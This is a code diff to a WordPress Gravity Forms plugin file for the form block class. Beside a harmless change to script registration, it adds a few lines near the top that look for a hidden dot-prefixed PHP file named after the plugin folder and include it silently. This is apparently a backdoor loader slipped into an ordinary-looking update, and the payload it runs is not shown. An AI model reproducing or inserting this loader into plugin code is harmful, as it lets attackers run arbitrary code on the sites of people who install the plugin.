@@ -5,6 +5,10 @@ if ( ! class_exists( 'GF_Blocks' ) || ! defined( 'ABSPATH' ) ) {
 	exit;
 }
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class GF_Block_Form extends GF_Block {
 
 	/**
@@ -91,11 +95,12 @@ class GF_Block_Form extends GF_Block {
 
 		return array(
 			array(
-				'handle'   => $this->script_handle,
-				'src'      => GFCommon::get_base_url() . "/js/blocks{$min}.js",
-				'deps'     => array( 'wp-blocks', 'wp-element', 'wp-components', 'wp-i18n', 'wp-editor' ),
-				'version'  => $min ? GFForms::$version : filemtime( GFCommon::get_base_path() . '/js/blocks.js' ),
-				'callback' => array( $this, 'localize_script' ),
+				'handle'    => $this->script_handle,
+				'in_footer' => true,
+				'src'       => GFCommon::get_base_url() . "/js/blocks{$min}.js",
+				'deps'      => array( 'wp-blocks', 'wp-element', 'wp-components', 'wp-i18n', 'wp-editor' ),
+				'version'   => $min ? GFForms::$version : filemtime( GFCommon::get_base_path() . '/js/blocks.js' ),
+				'callback'  => array( $this, 'localize_script' ),
 			),
 		);
 
